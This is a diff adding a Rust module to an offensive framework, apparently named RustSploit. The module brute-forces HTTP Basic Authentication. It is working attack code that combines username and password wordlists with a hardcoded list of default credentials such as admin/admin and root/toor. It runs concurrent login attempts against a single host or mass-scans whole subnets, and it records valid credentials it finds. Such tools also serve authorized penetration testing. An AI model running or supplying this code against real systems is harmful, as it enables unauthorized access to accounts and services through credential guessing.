@@ -1,0 +1,656 @@
+use anyhow::{Context, Result, anyhow};
+use colored::*;
+use std::io::Write;
+use std::net::IpAddr;
+use std::sync::Arc;
+use std::time::Duration;
+
+use crate::module::{Finding, FindingKind, ModuleCtx, ModuleOutcome};
+use crate::utils::network::build_http_client;
+use crate::utils::wordlist;
+use crate::utils::{
+    BruteforceConfig, LoginResult, SubnetScanConfig, generate_combos_mode, is_subnet_target,
+    load_credential_file, parse_combo_mode, run_bruteforce, run_subnet_bruteforce,
+};
+use crate::utils::{
+    cfg_prompt_default, cfg_prompt_existing_file, cfg_prompt_int_range, cfg_prompt_output_file,
+    cfg_prompt_yes_no, get_filename_in_current_dir, load_lines, normalize_target,
+};
+
+// ============================================================================
+// Constants
+// ============================================================================
+
+const DEFAULT_HTTP_PORT: u16 = 80;
+const DEFAULT_HTTPS_PORT: u16 = 443;
+
+const DEFAULT_CREDENTIALS: &[(&str, &str)] = &[
+    ("admin", "admin"),
+    ("admin", "password"),
+    ("admin", "1234"),
+    ("admin", "12345"),
+    ("admin", "123456"),
+    ("admin", ""),
+    ("root", "root"),
+    ("root", "password"),
+    ("root", "toor"),
+    ("root", ""),
+    ("user", "user"),
+    ("user", "password"),
+    ("test", "test"),
+    ("guest", "guest"),
+    ("manager", "manager"),
+];
+
+pub fn info() -> crate::module_info::ModuleInfo {
+    crate::module_info::ModuleInfo {
+        name: "HTTP Basic Auth Brute Force".to_string(),
+        description: "Brute-force HTTP Basic Authentication using username/password wordlists. \
+            Supports HTTPS with invalid certificate acceptance, default credential testing, \
+            combo mode, concurrent connections, and subnet/mass scanning."
+            .to_string(),
+        authors: vec!["RustSploit Contributors".to_string()],
+        references: vec![],
+        disclosure_date: None,
+        rank: crate::module_info::ModuleRank::Normal,
+        default_port: Some(80),
+    }
+}
+
+// ============================================================================
+// Error Classification
+// ============================================================================
+
+#[derive(Debug, Clone, PartialEq)]
+enum HttpErrorType {
+    AuthenticationFailed,
+    ConnectionRefused,
+    ConnectionTimeout,
+    TlsError,
+    Unknown,
+}
+
+impl HttpErrorType {
+    fn classify_error(msg: &str) -> Self {
+        let lower = msg.to_lowercase();
+        if lower.contains("401") || lower.contains("403") || lower.contains("unauthorized") {
+            Self::AuthenticationFailed
+        } else if lower.contains("refused")
+            || lower.contains("reset")
+            || lower.contains("broken pipe")
+        {
+            Self::ConnectionRefused
+        } else if lower.contains("timeout")
+            || lower.contains("timed out")
+            || lower.contains("deadline")
+        {
+            Self::ConnectionTimeout
+        } else if lower.contains("tls")
+            || lower.contains("ssl")
+            || lower.contains("certificate")
+            || lower.contains("handshake")
+        {
+            Self::TlsError
+        } else {
+            Self::Unknown
+        }
+    }
+
+    fn is_retryable(&self) -> bool {
+        matches!(
+            self,
+            Self::ConnectionRefused | Self::ConnectionTimeout | Self::Unknown
+        )
+    }
+
+    fn description(&self) -> &'static str {
+        match self {
+            Self::AuthenticationFailed => "Authentication failed",
+            Self::ConnectionRefused => "Connection refused/reset",
+            Self::ConnectionTimeout => "Connection timed out",
+            Self::TlsError => "TLS/SSL error",
+            Self::Unknown => "Unknown error",
+        }
+    }
+}
+
+#[derive(Debug)]
+struct HttpError {
+    error_type: HttpErrorType,
+    message: String,
+}
+
+impl std::fmt::Display for HttpError {
+    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+        write!(f, "[{}] {}", self.error_type.description(), self.message)
+    }
+}
+
+impl std::error::Error for HttpError {}
+
+impl HttpError {
+    fn from_string(msg: String) -> Self {
+        let error_type = HttpErrorType::classify_error(&msg);
+        Self {
+            error_type,
+            message: msg,
+        }
+    }
+}
+
+// ============================================================================
+// Module Entry Point
+// ============================================================================
+
+pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
+    let target = ctx
+        .target
+        .as_single()
+        .context("http_basic_bruteforce requires a single-host target")?;
+    crate::mprintln!(
+        "\n{}",
+        "=== HTTP Basic Auth Bruteforce Module (RustSploit) ==="
+            .bold()
+            .cyan()
+    );
+    crate::mprintln!();
+
+    // --- Subnet Scan Mode ---
+    if is_subnet_target(target) {
+        crate::mprintln!("{}", format!("[*] Target: {} (Subnet Scan)", target).cyan());
+
+        let use_https = cfg_prompt_yes_no("use_https", "Use HTTPS?", false).await?;
+        let default_port = if use_https {
+            DEFAULT_HTTPS_PORT
+        } else {
+            DEFAULT_HTTP_PORT
+        };
+        let port =
+            cfg_prompt_int_range("port", "Port", default_port as i64, 1, 65535).await? as u16;
+        let url_path = cfg_prompt_default("url_path", "URL path to test", "/").await?;
+
+        let usernames_file =
+            cfg_prompt_existing_file("username_wordlist", "Username wordlist").await?;
+        let passwords_file =
+            cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?;
+        let users = if wordlist::should_stream(&usernames_file) {
+            let mut lines = Vec::new();
+            let mut reader = wordlist::BatchedReader::open(&usernames_file).await?;
+            while let Some(batch) = reader.next_batch().await? {
+                lines.extend(batch);
+            }
+            lines
+        } else {
+            load_lines(&usernames_file)?
+        };
+        let passes = if wordlist::should_stream(&passwords_file) {
+            let mut lines = Vec::new();
+            let mut reader = wordlist::BatchedReader::open(&passwords_file).await?;
+            while let Some(batch) = reader.next_batch().await? {
+                lines.extend(batch);
+            }
+            lines
+        } else {
+            load_lines(&passwords_file)?
+        };
+        if users.is_empty() {
+            return Err(anyhow!("User list empty"));
+        }
+        if passes.is_empty() {
+            return Err(anyhow!("Pass list empty"));
+        }
+
+        let concurrency = cfg_prompt_int_range("concurrency", "Max concurrent hosts", 50, 1, 10000)
+            .await? as usize;
+        let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;
+        let output_file = cfg_prompt_output_file(
+            "output_file",
+            "Output result file",
+            "http_basic_subnet_results.txt",
+        )
+        .await?;
+
+        // build_http_client already disables redirects (its default) and
+        // accepts invalid certs — same shape, one canonical builder.
+        let subnet_client = Arc::new(
+            build_http_client(Duration::from_secs(5)).context("Failed to build HTTP client")?,
+        );
+
+        let limiter = ctx.limiter.clone();
+        let module_path = ctx.module_path.clone();
+        let hits = run_subnet_bruteforce(
+            target,
+            port,
+            users,
+            passes,
+            &SubnetScanConfig {
+                concurrency,
+                verbose,
+                output_file,
+                service_name: "http-basic",
+                jitter_ms: 50,
+                source_module: "creds/generic/http_basic_credcheck",
+                skip_tcp_check: false,
+                state_file: None,
+            },
+            move |ip: IpAddr, port: u16, user: String, pass: String| {
+                let url_path = url_path.clone();
+                let client = Arc::clone(&subnet_client);
+                let limiter = limiter.clone();
+                let module_path = module_path.clone();
+                async move {
+                    let scheme = if use_https { "https" } else { "http" };
+                    let url = format!("{}://{}:{}{}", scheme, ip, port, url_path);
+                    limiter.acquire(&module_path, &ip.to_string()).await;
+                    match try_http_login(&client, &url, &user, &pass).await {
+                        Ok(true) => LoginResult::Success,
+                        Ok(false) => LoginResult::AuthFailed,
+                        Err(e) => {
+                            let he = HttpError::from_string(e.to_string());
+                            LoginResult::Error {
+                                message: he.message,
+                                retryable: he.error_type.is_retryable(),
+                            }
+                        }
+                    }
+                }
+            },
+        )
+        .await?;
+        let mut outcome = ModuleOutcome::ok();
+        for (host, user, pass) in &hits {
+            outcome.findings.push(Finding {
+                target: host.clone(),
+                kind: FindingKind::Credential,
+                message: format!("Valid HTTP Basic Auth credentials found: {}:{}", user, pass),
+                data: Some(serde_json::json!({
+                    "username": user,
+                    "password": pass,
+                    "service": "http-basic",
+                    "port": port,
+                })),
+            });
+        }
+        return Ok(outcome);
+    }
+
+    // --- Single Target Mode ---
+    let mut outcome = ModuleOutcome::ok();
+    let use_https = cfg_prompt_yes_no("use_https", "Use HTTPS?", false).await?;
+    let default_port = if use_https {
+        DEFAULT_HTTPS_PORT
+    } else {
+        DEFAULT_HTTP_PORT
+    };
+    let port = cfg_prompt_int_range("port", "Port", default_port as i64, 1, 65535).await? as u16;
+    let url_path = cfg_prompt_default("url_path", "URL path to test", "/").await?;
+
+    let use_defaults =
+        cfg_prompt_yes_no("use_defaults", "Try default credentials first?", true).await?;
+
+    let usernames_file =
+        if cfg_prompt_yes_no("use_username_wordlist", "Use username wordlist?", true).await? {
+            Some(cfg_prompt_existing_file("username_wordlist", "Username wordlist").await?)
+        } else {
+            None
+        };
+
+    let passwords_file =
+        if cfg_prompt_yes_no("use_password_wordlist", "Use password wordlist?", true).await? {
+            Some(cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?)
+        } else {
+            None
+        };
+
+    if !use_defaults && usernames_file.is_none() && passwords_file.is_none() {
+        return Err(anyhow!(
+            "At least one wordlist or default credentials must be enabled"
+        ));
+    }
+
+    let concurrency =
+        cfg_prompt_int_range("concurrency", "Max concurrent tasks", 10, 1, 256).await? as usize;
+    let connection_timeout =
+        cfg_prompt_int_range("timeout", "Connection timeout (seconds)", 5, 1, 60).await? as u64;
+    let retry_on_error =
+        cfg_prompt_yes_no("retry_on_error", "Retry on connection errors?", true).await?;
+    let max_retries = if retry_on_error {
+        cfg_prompt_int_range("max_retries", "Max retries per attempt", 2, 1, 10).await? as usize
+    } else {
+        0
+    };
+    let stop_on_success =
+        cfg_prompt_yes_no("stop_on_success", "Stop on first success?", true).await?;
+    let save_results = cfg_prompt_yes_no("save_results", "Save results to file?", true).await?;
+    let save_path = if save_results {
+        Some(
+            cfg_prompt_output_file("output_file", "Output file", "http_basic_brute_results.txt")
+                .await?,
+        )
+    } else {
+        None
+    };
+    let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;
+    let combo_input =
+        cfg_prompt_default("combo_mode", "Combo mode (linear/combo/spray)", "combo").await?;
+
+    let scheme = if use_https { "https" } else { "http" };
+    let base_url = format!("{}://{}:{}{}", scheme, target, port, url_path);
+    let connect_addr = normalize_target(&format!("{}:{}", target, port)).unwrap_or_else(|e| {
+        tracing::debug!("normalize_target failed: {e}");
+        format!("{}:{}", target, port)
+    });
+
+    crate::mprintln!(
+        "\n{}",
+        format!(
+            "[*] Starting brute-force on {} ({})",
+            connect_addr, base_url
+        )
+        .cyan()
+    );
+
+    // Load wordlists — use streaming reader for large files to avoid OOM
+    let mut usernames = Vec::new();
+    if let Some(ref file) = usernames_file {
+        if wordlist::should_stream(file) {
+            let mut reader = wordlist::BatchedReader::open(file).await?;
+            while let Some(batch) = reader.next_batch().await? {
+                usernames.extend(batch);
+            }
+        } else {
+            usernames = load_lines(file)?;
+        }
+        if usernames.is_empty() {
+            crate::mprintln!("{}", "[!] Username wordlist is empty.".yellow());
+        } else {
+            crate::mprintln!(
+                "{}",
+                format!("[*] Loaded {} usernames", usernames.len()).green()
+            );
+        }
+    }
+
+    let mut passwords = Vec::new();
+    if let Some(ref file) = passwords_file {
+        if wordlist::should_stream(file) {
+            let mut reader = wordlist::BatchedReader::open(file).await?;
+            while let Some(batch) = reader.next_batch().await? {
+                passwords.extend(batch);
+            }
+        } else {
+            passwords = load_lines(file)?;
+        }
+        if passwords.is_empty() {
+            crate::mprintln!("{}", "[!] Password wordlist is empty.".yellow());
+        } else {
+            crate::mprintln!(
+                "{}",
+                format!("[*] Loaded {} passwords", passwords.len()).green()
+            );
+        }
+    }
+
+    // Add default credentials if requested
+    if use_defaults {
+        for (user, pass) in DEFAULT_CREDENTIALS {
+            if !usernames.contains(&user.to_string()) {
+                usernames.push(user.to_string());
+            }
+            if !passwords.contains(&pass.to_string()) {
+                passwords.push(pass.to_string());
+            }
+        }
+        crate::mprintln!(
+            "{}",
+            format!(
+                "[*] Added {} default credentials",
+                DEFAULT_CREDENTIALS.len()
+            )
+            .green()
+        );
+    }
+
+    if usernames.is_empty() {
+        return Err(anyhow!("No usernames available"));
+    }
+    if passwords.is_empty() {
+        return Err(anyhow!("No passwords available"));
+    }
+
+    let mut combos = generate_combos_mode(&usernames, &passwords, parse_combo_mode(&combo_input));
+    if cfg_prompt_yes_no(
+        "cred_file",
+        "Load additional user:pass combos from file?",
+        false,
+    )
+    .await?
+    {
+        let cred_path =
+            cfg_prompt_existing_file("cred_file_path", "Credential file (user:pass per line)")
+                .await?;
+        combos.extend(load_credential_file(&cred_path)?);
+    }
+
+    let shared_client = Arc::new(
+        build_http_client(Duration::from_secs(connection_timeout))
+            .context("Failed to build HTTP client")?,
+    );
+
+    let limiter = ctx.limiter.clone();
+    let module_path = ctx.module_path.clone();
+    let try_login = move |t: String, _p: u16, user: String, pass: String| {
+        let url = base_url.clone();
+        let client = Arc::clone(&shared_client);
+        let limiter = limiter.clone();
+        let module_path = module_path.clone();
+        async move {
+            limiter.acquire(&module_path, &t).await;
+            match try_http_login(&client, &url, &user, &pass).await {
+                Ok(true) => LoginResult::Success,
+                Ok(false) => LoginResult::AuthFailed,
+                Err(e) => {
+                    let he = HttpError::from_string(e.to_string());
+                    LoginResult::Error {
+                        message: he.message,
+                        retryable: he.error_type.is_retryable(),
+                    }
+                }
+            }
+        }
+    };
+
+    let result = run_bruteforce(
+        &BruteforceConfig {
+            target: target.to_string(),
+            port,
+            concurrency,
+            stop_on_success,
+            verbose,
+            delay_ms: 0,
+            max_retries,
+            service_name: "http-basic",
+            jitter_ms: 50,
+            source_module: "creds/generic/http_basic_credcheck",
+        },
+        combos,
+        try_login,
+    )
+    .await?;
+
+    result.print_found();
+    if let Some(ref path) = save_path {
+        result.save_to_file(path)?;
+    }
+
+    // Unknown / errored attempts
+    if !result.errors.is_empty() {
+        crate::mprintln!(
+            "{}",
+            format!(
+                "[?] Collected {} unknown/errored HTTP responses.",
+                result.errors.len()
+            )
+            .yellow()
+            .bold()
+        );
+        if cfg_prompt_yes_no(
+            "save_unknown_responses",
+            "Save unknown responses to file?",
+            true,
+        )
+        .await?
+        {
+            let default_name = "http_basic_unknown_responses.txt";
+            let fname = cfg_prompt_output_file(
+                "unknown_responses_file",
+                "What should the unknown results be saved as?",
+                default_name,
+            )
+            .await?;
+            let filename = get_filename_in_current_dir(&fname);
+            use std::os::unix::fs::OpenOptionsExt;
+            let mut opts = std::fs::OpenOptions::new();
+            opts.write(true).create(true).truncate(true);
+            opts.mode(0o600);
+            match opts.open(&filename) {
+                Ok(mut file) => {
+                    writeln!(
+                        file,
+                        "# HTTP Basic Auth Bruteforce Unknown/Errored Responses (host,user,pass,error)"
+                    )?;
+                    for (host, user, pass, msg) in &result.errors {
+                        writeln!(file, "{} -> {}:{} - {}", host, user, pass, msg)?;
+                    }
+                    file.flush()?;
+                    crate::mprintln!(
+                        "{}",
+                        format!("[+] Unknown responses saved to '{}'", filename.display()).green()
+                    );
+                }
+                Err(e) => {
+                    crate::mprintln!(
+                        "{}",
+                        format!(
+                            "[!] Could not create unknown response file '{}': {}",
+                            filename.display(),
+                            e
+                        )
+                        .red()
+                    );
+                }
+            }
+        }
+    }
+
+    for (host, user, pass) in &result.found {
+        outcome.findings.push(Finding {
+            target: host.clone(),
+            kind: FindingKind::Credential,
+            message: format!("Valid HTTP Basic Auth credentials found: {}:{}", user, pass),
+            data: Some(serde_json::json!({
+                "username": user,
+                "password": pass,
+                "service": "http-basic",
+                "port": port,
+            })),
+        });
+    }
+    Ok(outcome)
+}
+
+// ============================================================================
+// HTTP Basic Auth Login Attempt
+// ============================================================================
+
+/// Attempt HTTP Basic Auth login.
+/// Returns Ok(true) on 200 (success), Ok(false) on 401/403 (auth failed),
+/// Err on connection/protocol errors.
+async fn try_http_login(
+    client: &reqwest::Client,
+    url: &str,
+    user: &str,
+    pass: &str,
+) -> Result<bool> {
+    // Baseline probe WITHOUT credentials. If the endpoint serves 2xx to an
+    // unauthenticated request it is not actually protected by Basic Auth, so a
+    // subsequent 2xx with credentials is meaningless — treating it as a valid
+    // login produces a false positive for every credential pair. Only when the
+    // server challenges (401) does a credentialed 2xx confirm a real login.
+    let baseline = client
+        .get(url)
+        .send()
+        .await
+        .context("HTTP baseline request failed")?;
+    let baseline_status = baseline.status().as_u16();
+    let server_enforces_basic_auth = baseline_status == 401;
+
+    let response = client
+        .get(url)
+        .basic_auth(user, Some(pass))
+        .send()
+        .await
+        .context("HTTP request failed")?;
+
+    let status = response.status().as_u16();
+    match status {
+        200..=299 => {
+            if server_enforces_basic_auth {
+                Ok(true)
+            } else {
+                // Endpoint returns success without credentials too — cannot
+                // confirm these creds are valid. Report as a non-success
+                // rather than flooding loot with false positives.
+                Ok(false)
+            }
+        }
+        401 => Ok(false),
+        403 => {
+            crate::mprintln!(
+                "{}",
+                format!(
+                    "[?] 403 Forbidden for {}:{} — authenticated but unauthorized",
+                    user, pass
+                )
+                .yellow()
+                .dimmed()
+            );
+            Ok(false)
+        }
+        301 | 302 | 303 | 307 | 308 => {
+            // A redirect only signals success when the endpoint actually enforced
+            // auth (baseline 401). Apps that redirect ALL anonymous users to a
+            // dashboard would otherwise mark every credential valid.
+            if !server_enforces_basic_auth {
+                return Ok(false);
+            }
+            // Only count redirect as success if it doesn't point to a login/auth page
+            if let Some(location) = response.headers().get("location") {
+                let loc = location.to_str().unwrap_or("").to_lowercase();
+                if loc.contains("login")
+                    || loc.contains("auth")
+                    || loc.contains("signin")
+                    || loc.contains("sso")
+                {
+                    Ok(false) // Redirect to login page = auth failed
+                } else {
+                    Ok(true) // Redirect to non-login page = likely success
+                }
+            } else {
+                Err(anyhow!("HTTP {} redirect with no Location header", status))
+            }
+        }
+        // Definitive non-auth negatives from a responding server: treat as a clean
+        // failure (resets the consecutive-error counter) instead of a retryable
+        // Error that burns retries and trips the lockout give-up. 429/5xx fall
+        // through to the Err path below, where classify_error marks them retryable.
+        400 | 404 | 405 | 406 | 410 | 422 => Ok(false),
+        _ => Err(anyhow!("HTTP {}", status)),
+    }
+}
+
+crate::register_native_module!(
+    crate::module::Category::Creds,
+    "generic/http_basic_bruteforce",
+    native
+);
